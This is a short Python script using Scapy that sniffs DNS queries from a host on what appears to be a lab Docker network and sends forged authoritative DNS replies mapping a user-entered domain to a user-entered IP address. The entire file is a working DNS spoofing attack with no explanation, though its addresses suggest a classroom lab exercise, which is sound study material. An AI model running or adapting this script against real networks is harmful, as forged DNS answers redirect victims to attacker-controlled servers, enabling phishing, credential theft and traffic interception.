#!/usr/bin/env python3
from scapy.all import *

dom_name=input('enter user website:')
ip_add=input('enter id address:')

def spoof_dns(packet):
  if (DNS in packet and dom_name in packet[DNS].qd.qname.decode('utf-8')):
    packet.show()

    UDPpkt = UDP(dport=packet[UDP].sport, sport=53)

    Anssec = DNSRR(rrname=packet[DNS].qd.qname, rdata=ip_add)

    DNSpkt = DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, rd=0, qr=1,  
                 qdcount=1, ancount=1, nscount=0, arcount=0,
                 an=Anssec)

    response = IP(dst=packet[IP].src, src=packet[IP].dst)/UDPpkt/DNSpkt
    send(response)

f = 'udp and src host 10.9.0.53 and dst port 53'
packet = sniff(iface='br-e0ea12bfdd62', filter=f, prn=spoof_dns)      
